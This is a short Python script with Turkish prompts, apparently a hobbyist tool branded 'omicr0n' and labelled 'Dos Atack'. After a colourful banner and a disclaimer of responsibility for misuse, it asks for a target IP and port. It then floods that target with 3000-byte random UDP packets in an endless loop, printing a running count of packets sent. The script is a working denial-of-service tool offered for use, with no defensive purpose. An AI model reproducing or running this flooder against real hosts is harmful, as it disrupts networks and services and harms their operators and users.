from colorama import Fore, Style
import socket
import random
from os import system
from art import *
import sys
import time
from os import system

system("cls||clear")
def rainbow_text(text, delay=0.1):
    colors = [
    "\033[31m", "\033[33m", "\033[32m", "\033[36m", "\033[34m", "\033[35m", "\033[37m",
    ]

    for i in range(len(text)):
        char = text[i]
        color = colors[i % len(colors)]
        sys.stdout.write(color + char)
        sys.stdout.flush()
        time.sleep(delay)

    sys.stdout.write("\033[0m")
    sys.stdout.write("\n")

def main():
    rainbow_text("Coding by omicr0n")
    sys.stdout.write("\033[37m")
    sys.stdout.write("Coding by Omicron\n")
	
if __name__ == "__main__":
    rainbow_text("Coding by omicr0n")


omicron = text2art("omicron", font='shadow')
system("cls||clear")
print(omicron)
banner = Fore.LIGHTMAGENTA_EX + "╔═" + "═" * 13 + "╗\n" \
         "║    Dos Atack ?    ║\n" \
         "╚═" + "═" * 13 + "╝"

print(banner)
print(Fore.YELLOW + Style.BRIGHT + """


ℹ️ Kötüye kullanım dahilinde sorumluluk almamaktayım!\n""")
print(Fore.LIGHTGREEN_EX + "{</>} " + Style.RESET_ALL + "Made by " +
      Fore.LIGHTGREEN_EX + Style.BRIGHT + "omicr0n\n")


hedefIp = input(Fore.LIGHTBLUE_EX + "📶 Hedef ip giriniz: ")  # Wi-Fi ikonu eklendi
hedefPort = int(input(Fore.LIGHTBLUE_EX + "🔍 Hedef port giriniz: "))  # Arama/Bulma ikonu eklendi

bytes = random._urandom(3000)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

sayac = 0

while True:
    sock.sendto(bytes, (hedefIp, hedefPort))
    sayac = sayac + 1
    print(Fore.LIGHTRED_EX + "🔒 Saldırı başlatıldı, gönderilen paket:%s" % (sayac))  # Kilit ve Güvenlik ikonu eklendi
